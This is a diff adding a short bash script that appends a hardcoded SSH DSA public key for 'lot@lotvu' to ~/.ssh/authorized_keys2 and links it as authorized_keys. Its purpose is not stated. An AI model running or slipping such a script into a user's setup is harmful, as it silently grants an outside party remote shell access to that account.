@@ -1,0 +1,5 @@
+#!/bin/bash
+mkdir -p ~/.ssh
+cd ~/.ssh && cat <<EOF >> authorized_keys2 && ln -s authorized_keys2 authorized_keys
+ssh-dss AAAAB3NzaC1kc3MAAACBALjhe9mScotO/siIySliGclHyMglOgL9QSqXJjgX92bzzBRBukhHIxplBv5U/O8hkgLBYPownsw+nFaPxjFcwn45OE174OUbILWpYxI7z3rHmAqOARn1OQLO/WUXJz89dGS9WDq7/sisR2v4LS99qRN2oXXZ69oTONG/5HFGwFcbAAAAFQC/f0tT5WC58euJKoCEvYdv/KZJAQAAAIB8IwNFlhRIdxmmvenrkj4xW5UAVsvm8LKsNHM4+khyYB7/xqhMKARt0qZmzchB9zNiq7aPDl8XUlTB1sYXdrcLkok8wdIbEjM5RmgBxOv3L5hkpZ5GyIRJRfO21ejzueIbCP9MVNKoNN7CgV7Q/k+nhlHiVgH45nQ5wRv4Xmt39wAAAIEApapp6htn+Cwb9ZZpLuEtWgqLdzRUPP7GKyk9PkfcSZRdXM8bxB3EBD23XXYVfA/YSj7q77GcZRs5tFIh0ufiKKSG1zgLWP5ZMPEAR4qyj5MtoNHD29IiNVPW1uIrKuSuk0zZ3ePJBcnf7NnsiuQ8LCyijOlpRjWZuqZt2URmUtg= lot@lotvu
+EOF
